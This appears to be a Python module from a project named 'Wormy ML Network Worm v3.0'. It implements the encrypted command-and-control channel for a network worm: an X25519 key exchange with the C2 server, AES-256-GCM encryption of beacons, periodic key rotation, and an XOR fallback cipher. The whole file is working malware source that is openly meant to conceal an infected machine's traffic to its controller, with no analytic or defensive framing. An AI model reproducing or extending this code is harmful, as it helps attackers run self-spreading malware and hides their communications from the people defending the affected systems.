"""
Wormy ML Network Worm v3.0 - Perfect Forward Secrecy Crypto
X25519 ECDH key exchange + AES-GCM session encryption.
Replaces the static XOR+SHA256 scheme in resilient_c2.py.
"""

import base64
import hashlib
import json
import os
import struct
import time
from typing import Dict, Optional, Tuple

# ── dependency check ─────────────────────────────────────────────────────────
try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF

    _CRYPTO_AVAILABLE = True
except ImportError:
    _CRYPTO_AVAILABLE = False


class PFSCrypto:
    """
    Perfect Forward Secrecy channel using X25519 + HKDF + AES-256-GCM.

    Protocol:
      Agent                          C2 Server
        |---[agent_pub_key (32B)]------->|
        |<--[server_pub_key (32B)]-------|
        |   shared = X25519(priv, peer) |
        |   session_key = HKDF(shared)  |
        |---[AES-GCM encrypted msgs]--->|

    Each connection generates a fresh ephemeral key pair.
    Compromise of long-term key does NOT expose past sessions.
    """

    NONCE_SIZE = 12  # GCM standard
    KEY_SIZE = 32  # AES-256
    HKDF_INFO = b"wormy-v3-session"
    HKDF_SALT = b"wormy-pfs-salt-2024"

    def __init__(self):
        self._private_key: Optional[object] = None
        self._session_key: Optional[bytes] = None
        self._peer_pub_raw: Optional[bytes] = None
        self._available = _CRYPTO_AVAILABLE
        if self._available:
            self._rotate_keys()
        else:
            # Fallback: warn but don't crash
            self._fallback_key = os.urandom(32)

    # ─── key management ──────────────────────────────────────────────────────

    def _rotate_keys(self):
        """Generate a fresh ephemeral X25519 key pair."""
        if not self._available:
            return
        self._private_key = X25519PrivateKey.generate()
        self._session_key = None  # invalidated until handshake completes
        self._peer_pub_raw = None

    def get_public_key_bytes(self) -> bytes:
        """Return raw 32-byte public key to send to peer."""
        if not self._available or not self._private_key:
            return os.urandom(32)
        return self._private_key.public_key().public_bytes(
            serialization.Encoding.Raw, serialization.PublicFormat.Raw
        )

    def complete_handshake(self, peer_pub_raw: bytes) -> bool:
        """
        Compute shared secret and derive session key via HKDF-SHA256.
        Call this after receiving the peer's 32-byte public key.
        """
        if not self._available or not self._private_key:
            return False
        try:
            peer_pub = X25519PublicKey.from_public_bytes(peer_pub_raw)
            shared = self._private_key.exchange(peer_pub)
            self._session_key = HKDF(
                algorithm=hashes.SHA256(),
                length=self.KEY_SIZE,
                salt=self.HKDF_SALT,
                info=self.HKDF_INFO,
            ).derive(shared)
            self._peer_pub_raw = peer_pub_raw
            return True
        except Exception:
            return False

    def rotate(self):
        """Rotate to a new ephemeral key pair (call periodically)."""
        self._rotate_keys()

    # ─── encryption / decryption ─────────────────────────────────────────────

    def encrypt(self, plaintext: bytes, aad: bytes = b"wormy") -> Optional[bytes]:
        """
        Encrypt with AES-256-GCM.
        Output format: nonce(12) || ciphertext+tag
        Falls back to AES-CBC-HMAC if session key not yet negotiated.
        """
        if self._available and self._session_key:
            nonce = os.urandom(self.NONCE_SIZE)
            ct = AESGCM(self._session_key).encrypt(nonce, plaintext, aad)
            return nonce + ct
        # Fallback: XOR with random key + HMAC integrity
        return self._fallback_encrypt(plaintext)

    def decrypt(self, ciphertext: bytes, aad: bytes = b"wormy") -> Optional[bytes]:
        """Decrypt AES-256-GCM ciphertext (nonce||ct+tag)."""
        if self._available and self._session_key:
            if len(ciphertext) < self.NONCE_SIZE + 16:
                return None
            nonce = ciphertext[: self.NONCE_SIZE]
            ct = ciphertext[self.NONCE_SIZE :]
            try:
                return AESGCM(self._session_key).decrypt(nonce, ct, aad)
            except Exception:
                return None
        return self._fallback_decrypt(ciphertext)

    def encrypt_json(self, obj: dict) -> Optional[str]:
        """Encrypt a dict and return base64 string."""
        raw = json.dumps(obj).encode()
        enc = self.encrypt(raw)
        return base64.b64encode(enc).decode() if enc else None

    def decrypt_json(self, b64: str) -> Optional[dict]:
        """Decrypt a base64 string back to dict."""
        try:
            raw = self.decrypt(base64.b64decode(b64))
            return json.loads(raw) if raw else None
        except Exception:
            return None

    # ─── fallback (no cryptography lib) ─────────────────────────────────────

    def _fallback_encrypt(self, plaintext: bytes) -> bytes:
        """XOR stream cipher with random 32-byte key + SHA256 MAC."""
        key = self._fallback_key
        nonce = os.urandom(16)
        ks = hashlib.sha256(key + nonce).digest()
        # extend keystream
        while len(ks) < len(plaintext):
            ks += hashlib.sha256(ks).digest()
        ct = bytes(a ^ b for a, b in zip(plaintext, ks[: len(plaintext)]))
        mac = hashlib.sha256(key + nonce + ct).digest()[:16]
        return nonce + ct + mac

    def _fallback_decrypt(self, data: bytes) -> Optional[bytes]:
        if len(data) < 32:
            return None
        key, nonce, ct, mac = (self._fallback_key, data[:16], data[16:-16], data[-16:])
        exp_mac = hashlib.sha256(key + nonce + ct).digest()[:16]
        if exp_mac != mac:
            return None
        ks = hashlib.sha256(key + nonce).digest()
        while len(ks) < len(ct):
            ks += hashlib.sha256(ks).digest()
        return bytes(a ^ b for a, b in zip(ct, ks[: len(ct)]))

    # ─── status ──────────────────────────────────────────────────────────────

    def has_session(self) -> bool:
        return self._session_key is not None

    def is_available(self) -> bool:
        return self._available

    def get_status(self) -> Dict:
        return {
            "pfs_available": self._available,
            "session_active": self.has_session(),
            "algorithm": "X25519+HKDF+AES-256-GCM" if self._available else "XOR+SHA256 (fallback)",
            "peer_pub": self._peer_pub_raw.hex()[:16] + "..." if self._peer_pub_raw else None,
        }


class PFSChannel:
    """
    High-level wrapper that integrates PFSCrypto with the C2 HTTP transport.
    Manages handshake and automatic key rotation every N beacons.
    """

    ROTATION_INTERVAL = 50  # rotate session key every 50 beacons

    def __init__(self):
        self._crypto = PFSCrypto()
        self._beacon_count = 0
        self._handshake_done = False

    def build_hello_packet(self) -> Dict:
        """First packet to send to C2 — contains our ephemeral public key."""
        return {
            "type": "hello",
            "pub_key": base64.b64encode(self._crypto.get_public_key_bytes()).decode(),
            "timestamp": time.time(),
        }

    def process_hello_response(self, response: Dict) -> bool:
        """Process C2's hello response containing its ephemeral public key."""
        try:
            peer_pub = base64.b64decode(response.get("pub_key", ""))
            if self._crypto.complete_handshake(peer_pub):
                self._handshake_done = True
                return True
            return False
        except Exception:
            return False

    def send(self, payload: Dict) -> Optional[str]:
        """Encrypt payload dict for transmission."""
        if not self._handshake_done:
            return json.dumps(payload)  # unencrypted until handshake
        self._beacon_count += 1
        if self._beacon_count % self.ROTATION_INTERVAL == 0:
            # Trigger re-handshake next beacon cycle
            self._handshake_done = False
            self._crypto.rotate()
        return self._crypto.encrypt_json(payload)

    def receive(self, data: str) -> Optional[Dict]:
        """Decrypt received data."""
        if not self._handshake_done:
            try:
                return json.loads(data)
            except Exception:
                return None
        return self._crypto.decrypt_json(data)

    def get_status(self) -> Dict:
        return {
            **self._crypto.get_status(),
            "handshake_done": self._handshake_done,
            "beacons_sent": self._beacon_count,
        }
